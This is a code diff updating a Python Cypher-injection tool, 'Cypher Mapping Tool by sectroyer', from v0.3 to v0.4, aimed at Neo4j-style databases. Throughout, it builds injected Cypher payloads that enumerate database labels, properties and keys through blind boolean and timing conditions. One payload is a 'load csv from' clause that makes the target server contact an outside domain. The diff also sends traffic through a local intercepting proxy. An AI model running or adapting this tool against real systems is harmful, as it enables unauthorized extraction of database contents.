@@ -18,7 +18,7 @@ arbitary_timeout_sleep_value=10
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
     global timeout_subdomain
     proxies={}
-    #proxies={'http':'http://localhost:8080'}
+    proxies={'http':'http://localhost:8080'}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
     try:
         if post_data:
@@ -37,7 +37,7 @@ def replace_last_and(input_str):
     global timeout_domain, timeout_subdomain
     last_and_index = input_str.rfind(' and ')
     if last_and_index != -1:
-        return input_str[:last_and_index] + " and exists {load csv from 'http://"+timeout_subdomain+timeout_domain+"/' as csv_test} and " + input_str[last_and_index+5:]
+        return input_str[:last_and_index] + " then exists {load csv from 'http://"+timeout_subdomain+timeout_domain+"/' as csv_test} else false end and " + input_str[last_and_index+5:]
     else:
         return input_str
 
@@ -45,6 +45,7 @@ def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connect
     global arbitary_timeout_sleep_value
     if not use_blind:
         payload=replace_last_and(payload)
+        payload=payload.replace(" and ", " and case when ", 1)
     # Check if '*' is in target_url
     if '*' in target_url:
         encoded_payload = urllib.parse.quote_plus(payload)
@@ -109,21 +110,14 @@ def get_number_of_results(target_url, payload, blind_string, post_data, cookies_
     for number_of_results in range(1000): # arbitarily set max number or results to 1000 :)
         current_payload=payload.replace("%NUMBER_OF_RESULTS%",str(number_of_results))
         injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
-        if blind_string and injection_result and blind_string in injection_result:
+        if (blind_string and injection_result and blind_string in injection_result) or (not blind_string and not injection_result):
             return number_of_results
-        if not blind_string:
-            if injection_result:
-                return number_of_results
     print("Unable to check number of results!!!")
     sys.exit(-1)
 
 def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    if blind_string:
-        payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
-        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-    else:
-        payload = injection_type + " and exists {call db.labels() yield label with label skip %NUMBER_OF_RESULTS% limit 1 return label}" 
-        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
+    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
 def get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
@@ -215,7 +209,7 @@ def dump_properties(target_url, label_to_dump, injection_type, blind_string, pos
     return label_properties_array
 
 def get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'  return t[key]"
+    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'  return t[key]}"
     payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
@@ -280,7 +274,7 @@ def dump_ascii_table(data, shouldPrintHeader=False):
     print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
 
 
-print('\nCypher Mapping Tool by sectroyer v0.3\n')
+print('\nCypher Mapping Tool by sectroyer v0.4\n')
 
 try:
     parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
